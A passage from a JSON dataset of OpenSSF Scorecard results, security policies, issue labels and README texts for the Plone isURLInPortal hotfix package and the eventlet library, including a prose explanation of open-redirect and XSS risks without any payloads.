                        "Info: collective contributor org/company found, repoze contributor org/company found, zestsoftware contributor org/company found, py76 contributor org/company found, Softcatala contributor org/company found, derFreitag contributor org/company found, plone contributor org/company found, zopefoundation contributor org/company found, buildout contributor org/company found, vlaamsemilieumaatschappij contributor org/company found, der freitag contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 11 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Warn: project does not have a license file"
                    ],
                    "score": 0,
                    "reason": "license file not detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "13 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no dependencies found",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 23 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/plone/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/plone/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/plone/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/meta.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/plone/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security\n\nFor the Plone Foundation, security is a process that we take seriously, and we have the track record to prove it.\n\n- [Report a security issue](https://plone.org/security/report)\n- [Security Announcements](https://plone.org/security/announcements)\n- [Read more about security in Plone](https://plone.org/security)\n",
        "project_all_labels": [
            "01 type: bug",
            "02 type: regression",
            "03 type: feature (plip)",
            "04 type: enhancement",
            "05 type: question",
            "11 prio: blocker",
            "12 prio: high",
            "13 prio: normal",
            "14 prio: low",
            "21 status: confirmed",
            "22 status: in-progress",
            "23 status: testing",
            "24 status: deferred",
            "24 status: ready",
            "31 needs: help",
            "32 needs: review",
            "33 needs: docs",
            "34 needs: tests",
            "35 needs: rebase",
            "36 needs: cla",
            "37 needs: release",
            "41 lvl: easy",
            "42 lvl: moderate",
            "43 lvl: complex",
            "51 target: patch",
            "52 target: minor",
            "53 target: major"
        ],
        "README_content": "isURLInPortal patch for Plone\n=============================\n\nThis patches the ``isURLInPortal`` method in Plone.\nThe method is in ``Products.CMFPlone/URLTool.py`` in the ``URLTool`` class.\nBasic use in a page template is::\n\n  <a\n    tal:define=\"url request/came_from\"\n    tal:attributes=\"href url\"\n    tal:condition=\"python:context.portal_url.isURLInPortal(url)\">\n      This link is only shown when it is somewhere in the Plone portal.\n  </a>\n\n\nWhat does isURLInPortal do?\n---------------------------\n\nThe ``isURLInPortal`` method in Plone is used in several places.\nIt checks if a url is (probably) within the current Plone Site.\nIf so, then this url is safe to redirect to, or is safe to show on a page.\n\nFor example, if your site is ``http://demo.plone.org``, then these urls are in the site:\n\n- Full url: ``http://demo.plone.org/some-folder/some-page``\n- Relative url: ``some-folder/some-page``, ``/somewhere/else``, ``../in/parent``\n\nAnd these are not in the site:\n\n- ``example.org``\n- ``otherdomain.plone.org``\n\nThe code does *not* check if something is actually found at the url.\nIt only checks if the url would be within the site.\n\nIf this method fails to do its job, then an attacker could do a successful hack.\nAn attack can look like this:\n\n- An attacker sends you an email with a specially crafted link.\n  Or the attacker posts this link on a popular site that you visit.\n- The link is to a Plone Site that you know and trust, so you click it.\n- You see the expected Plone Site.  Maybe you login, but this may not be needed.\n\nAnd then one of the following things happens:\n\n- Open redirection: Somewhere on the page is a link to a malicious site.\n  In a fishing attack, this site may look like the Plone Site you expect.\n- Open redirection: You are *automatically* redirected to a malicious site.\n- Reflected XSS (Cross Site Scripting):\n  Malicious javascript is loaded that grabs private information from the page and sends it to the attacker.\n  Or it is used to create content in your name, with more malicious code, or with spam.\n- Stored XSS: If you are logged in as Editor in Plone, malicious javascript is stored, which is loaded by other visitors.\n\nLet's not list the sort of urls that might have tricked this method in the past:\nthere is no need to give hackers and script kiddies more ideas.\n\n\nHotfixes\n--------\n\nDuring the years, there have been various security hotfixes that patch this method.\nUsually this is because someone has alerted the `Plone Security Team <mailto:security@plone.org>`_ to a possible hack.\nIf we see that there is indeed a security problem, then we have to decide whether to publish a hotfix or not.\n\nIt may feel like overkill to create a hotfix for this and alert the entire Plone community, advising them to patch all their sites.\nA lot of them may not be vulnerable.\nFor example:\n\n- Modern browsers have protection against some of this, especially reflected XSS.\n  We have had reports that we could not initially reproduce because of this.\n- Some attacks are only for authenticated users.\n  The frontend web server may have been setup to redirect the login form to a server that is only available internally.\n- Some attacks are only for sites that have open registration, where everyone can make an account.\n  This is probably not the case for most Plone sites.\n- There may be a firewall in place that protects against these attacks.\n  The vulnerable request may not even reach Plone.\n\nAn extra problem: multiple hotfixes patch the same method.\nIf you have Plone 4.3.0, and you have installed all hotfixes, then you have eleven of them.\nSeveral of these patch this method.\nIf you load the oldest hotfix first, then it should work okay.\nThe other way around may even also work, although it is not recommended.\n\nBut we don't test the hotfixes in combination with *all* other hotfixes.\nWe sometimes test with a few though, and in some cases a new hotfix explicitly tries to load an older hotfix first.\n\nAnd it has a (probably small) impact on performance:\nmost hotfixed versions of this method do their specific check, and then call the original method.\nSo it may look like this:\n\n- A call is made to ``isURLInPortal``.\n- This method is patched by ``PloneHotfix20200121``, so it executes its own code, and then calls the original method.\n- This method is patched by ``PloneHotfix20171128``, so it executes its own code, and then calls the original method.\n- This finally is the code in ``CMFPlone``.\n- The three versions have overlap, leading to the same code being executed two or three times.\n\n\nIdea: separate package\n----------------------\n\nThe idea now is: let's put this method into a separate package.\nThis package would work as hotfix for all current Plone versions, or at least 4.3 and higher.\nNewer releases of CMFPlone would depend on this package, so it is automatically included.\nThe new package would be the canonical place of the method.\nWe would remove the method from newer CMFPlone releases.\n\nIf a new vulnerability is then detected, we would fix it and release a new version of this package.\nFixing your site would then be:\n\n- Edit the version number of the new package in the versions section of your buildout.\n- Stop the site.\n- Run buildout.\n- Start the site.\n\nWe could still announce it as a hotfix if we want.\n\nSince all hotfixes are in the ``Products`` namespace, we put this package in the same namespace.\nCode in this namespace is automatically loaded by Plone/Zope.\nAlso, this makes it easier to extract the main directory (``isurlinportal``) of this package and put it in an old-style ``products`` folder.\nThen you can just restart Plone without having to run buildout.\nThis is mainly an issue for older Plone sites that have not been maintained well.\n\n\nVersion numbers\n---------------\n\nYou should always use the latest version of this package that is compatible with your Plone version.\n\n- Major/breaking release, X.0.0:\n  Likely a new vulnerability was patched.\n  Please update as soon as possible.\n  But this may drop support for an older Plone or Python version, so read the changelog.\n  If you have an older Plone, check if there is an older update.\n- Minor/feature release: x.Y.0:\n  A new vulnerability was patched.\n  Please update as soon as possible.\n- Micro/bugfix release: x.y.Z:\n  A bug was fixed, but no new vulnerability was patched.\n  Update at a time of your choosing, or if you experience problems.\n\nVersion 1.x is compatible with Plone 4.3, 5.0, 5.1, 5.2, 6.0.\nVersion 2.x is compatible with Plone 6.0.\nVersion 3.x is compatible with Plone 6.1 and higher.\n\n\nReporting vulnerabilities or bugs\n---------------------------------\n\nIf you suspect you have found a vulnerability, please contact the `Plone Security Team <mailto:security@plone.org>`_ by email.\nIf you prefer a more secure way, we can also arrange that via email.\n\nIf you see a non-security bug, you can open an issue, or create a pull request.\nWhen in doubt, please email us.\n",
        "num_commits": 119,
        "project_age_days": 1561,
        "project_created_at": "2020-07-21",
        "latest_updated_at": "2024-10-08",
        "latest_pushed_at": "2024-10-08",
        "num_contributors": 7,
        "num_pull": 26,
        "num_issues": 31,
        "num_opening_issue": 0,
        "project_size(kB)": 146,
        "num_stargazers": 2,
        "num_watchers": 2,
        "num_forks": 1,
        "num_subscribers": 194,
        "SecurityPolicy_created_at": "2022-09-05 20:09:11",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "47ff7694394edf6ba41de1013a92cc7f29ef63cc",
                "url": "https://github.com/plone/.github/commit/47ff7694394edf6ba41de1013a92cc7f29ef63cc",
                "date": "2023-12-12 17:03:38"
            },
            {
                "commit_id": "5f49fac5c2144112659a34c92af31bf7d6ebd51a",
                "url": "https://github.com/plone/.github/commit/5f49fac5c2144112659a34c92af31bf7d6ebd51a",
                "date": "2022-09-05 20:09:11"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "eventlet/eventlet",
        "project_url": "https://github.com/eventlet/eventlet",
        "SSF": {
            "date": "2024-10-29T19:25:52+07:00",
            "repo": {
                "name": "github.com/eventlet/eventlet",
                "commit": "8637820f468268ffb0b8504561ea4772de23fcdb"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.2,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: massfidelity contributor org/company found, BirdseyeSoftware contributor org/company found, psf contributor org/company found, projg2 contributor org/company found, historymesh contributor org/company found, gr0und-s3ct0r contributor org/company found, openuado contributor org/company found, lambda labs contributor org/company found, red hat contributor org/company found, gentoo-mirror contributor org/company found, django contributor org/company found, jointakahe contributor org/company found, gevent contributor org/company found, deltachat contributor org/company found, Spacelog contributor org/company found, eventlet contributor org/company found, python contributor org/company found, redhatofficial contributor org/company found, nameko contributor org/company found, epio contributor org/company found, Moritz-Systems contributor org/company found, httplib2 contributor org/company found, red hat - openstack core developer contributor org/company found, van-clj contributor org/company found, http://twitter.com/tavisrudd/ contributor org/company found, intel contributor org/company found, gentoo contributor org/company found, NetBSD contributor org/company found, llvm contributor org/company found, conda-forge contributor org/company found, OpenGenus contributor org/company found, beaglecli contributor org/company found, pytest-dev contributor org/company found, async-email contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 34 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "1 commit(s) and 7 issue activity found in the last 90 days -- score normalized to 6",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish.yaml:17"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yaml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/docs.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yaml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/docs.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yaml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/publish.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yaml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/publish.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yaml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/publish.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/style.yaml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/style.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/style.yaml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/style.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/style.yaml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/style.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/style.yaml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/style.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:78: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:107: update your workflow using https://app.stepsecurity.io/secureworkflow/eventlet/eventlet/test.yaml/master?enable=pin",
                        "Warn: goCommand not pinned by hash: bin/bench-compare:73",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yaml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yaml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yaml:29",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yaml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/style.yaml:39",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yaml:83",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yaml:110",
                        "Info:   0 out of  13 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 goCommand dependencies pinned",
                        "Info:   0 out of   7 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/style.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/eventlet/eventlet/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nmaster branch and latest release get priority support. You should expect all known problems fixed in master.\n\nAll other released versions receive security updates per request.\nIf you use some old version and can not upgrade for any or no reason, ask for security update release, most likely you will get it.\n\n## Reporting a Vulnerability\n\nContact current maintainers. At 2021-03: temotor@gmail.com or https://t.me/temotor\nIf that doesn't work, open Github issue just asking for private communication channel.\n\nThis is volunteer maintained project, all issues are processed on best effort basis, no deadlines promised. Of course, security vulnerabilities get priority over regular issues.\n\nYou can expect fame in history or maybe you prefer anonymity - say what you prefer.\n\nThank you for responsible handling of security problems. Your attention and effort are appreciated.\n",
        "project_all_labels": [
            "asyncio",
            "bug",
            "changelog",
            "deprecation",
            "design",
            "doc",
            "feature",
            "feature-dns",
            "feature-psycopg",
            "feature-tls",
            "feature-websocket",
            "feature-wsgi",
            "feature-zmq",
            "governance",
            "greenthreads",
            "importance-bug",
            "importance-enhancement",
            "important",
            "infra",
            "invalid",
            "need-contributor",
            "need-feedback",
            "need-test",
            "platform-bsd",
            "platform-osx",
            "platform-python2",
            "platform-python3",
            "platform-python3.10+",
            "platform-windows",
            "Python3.12_compat",
            "Python3.13_compat",
            "release",
            "resolution-duplicate",
            "resolution-question",
            "resolution-wontfix",
            "security",
            "tests",
            "tracing",
            "urgent"
        ],
        "README_content": "Warning\n=======\n\n**New usages of eventlet are now heavily discouraged! Please read the\nfollowing.**\n\nEventlet was created almost 18 years ago, at a time where async\nfeatures were absent from the CPython stdlib. With time eventlet evolved and\nCPython too, but since several years the maintenance activity of eventlet\ndecreased leading to a growing gap between eventlet and the CPython\nimplementation.\n\nThis gap is now too high and can lead you to unexpected side effects and bugs\nin your applications.\n\nEventlet now follows a new maintenance policy. **Only maintenance for\nstability and bug fixing** will be provided. **No new features will be\naccepted**, except those related to the asyncio migration. **Usages in new\nprojects are discouraged**. **Our goal is to plan the retirement of eventlet**\nand to give you ways to move away from eventlet.\n\nIf you are looking for a library to manage async network programming,\nand if you do not yet use eventlet, then, we encourage you to use `asyncio`_,\nwhich is the official async library of the CPython stdlib.\n\nIf you already use eventlet, we hope to enable migration to asyncio for some use\ncases; see `Migrating off of Eventlet`_. Only new features related to the migration\nsolution will be accepted.\n\nIf you have questions concerning maintenance goals or concerning\nthe migration do not hesitate to `open a new issue`_, we will be happy to\nanswer them.\n\n.. _asyncio: https://docs.python.org/3/library/asyncio.html\n.. _open a new issue: https://github.com/eventlet/eventlet/issues/new\n.. _Migrating off of Eventlet: https://eventlet.readthedocs.io/en/latest/asyncio/migration.html#migration-guide\n\nEventlet\n========\n\n.. image:: https://img.shields.io/pypi/v/eventlet\n    :target: https://pypi.org/project/eventlet/\n\n.. image:: https://img.shields.io/github/actions/workflow/status/eventlet/eventlet/test.yaml?branch=master\n    :target: https://github.com/eventlet/eventlet/actions?query=workflow%3Atest+branch%3Amaster\n\n.. image:: https://codecov.io/gh/eventlet/eventlet/branch/master/graph/badge.svg\n    :target: https://codecov.io/gh/eventlet/eventlet\n\n\nEventlet is a concurrent networking library for Python that allows you to change how you run your code, not how you write it.\n\nIt uses epoll or libevent for highly scalable non-blocking I/O.  Coroutines ensure that the developer uses a blocking style of programming that is similar to threading, but provide the benefits of non-blocking I/O.  The event dispatch is implicit, which means you can easily use Eventlet from the Python interpreter, or as a small part of a larger application.\n\nIt's easy to get started using Eventlet, and easy to convert existing\napplications to use it.  Start off by looking at the `examples`_,\n`common design patterns`_, and the list of `basic API primitives`_.\n\n.. _examples: https://eventlet.readthedocs.io/en/latest/examples.html\n.. _common design patterns: https://eventlet.readthedocs.io/en/latest/design_patterns.html\n.. _basic API primitives: https://eventlet.readthedocs.io/en/latest/basic_usage.html\n\n\nGetting Eventlet\n================\n\nThe easiest way to get Eventlet is to use pip::\n\n  pip install -U eventlet\n\nTo install latest development version once::\n\n  pip install -U https://github.com/eventlet/eventlet/archive/master.zip\n\n\nBuilding the Docs Locally\n=========================\n\nTo build a complete set of HTML documentation::\n\n  tox -e docs\n\nThe built html files can be found in doc/build/html afterward.\n\nSupported Python versions\n=========================\n\nPython 3.7-3.12 are currently supported.\n",
        "num_commits": 2547,
        "project_age_days": 4340,
        "project_created_at": "2012-12-11",
        "latest_updated_at": "2024-10-26",
        "latest_pushed_at": "2024-09-12",
        "num_contributors": 140,
        "num_pull": 437,
        "num_issues": 982,
        "num_opening_issue": 222,
        "project_size(kB)": 9238,
        "num_stargazers": 1245,
        "num_watchers": 1245,
        "num_forks": 324,
        "num_subscribers": 63,
        "SecurityPolicy_created_at": "2021-03-31 20:44:04",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "71b76bfc5166050dc333c72ead6b51a8933061e7",
                "url": "https://github.com/eventlet/eventlet/commit/71b76bfc5166050dc333c72ead6b51a8933061e7",
                "date": "2021-03-31 20:44:04"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/eventlet/eventlet/pull/916",
